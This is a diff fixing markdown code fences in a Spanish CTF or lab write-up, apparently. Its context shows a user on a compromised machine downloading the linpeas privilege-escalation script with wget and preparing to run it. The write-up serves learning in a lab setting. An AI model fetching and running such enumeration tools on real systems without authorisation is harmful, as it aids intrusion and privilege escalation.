@@ -513,7 +513,7 @@ Como no podemos utilizar `sudo -l`, vamos a descargarnos y ejecutar `linpeas`.
 
 Para descargar `linpeas`, ejecutamos el siguiente comando:
 
-\```shell
+```shell
 mortadela@mortadela:~$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 --2024-07-15 16:12:57--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 Resolviendo github.com (github.com)... 140.82.121.3
@@ -537,7 +537,7 @@ linpeas_linux_amd64                                                            1
 
 mortadela@mortadela:~$ ls
 linpeas_linux_amd64  user.txt
-\```
+```
 Damos permisos al ejecutable
 
 ```bash
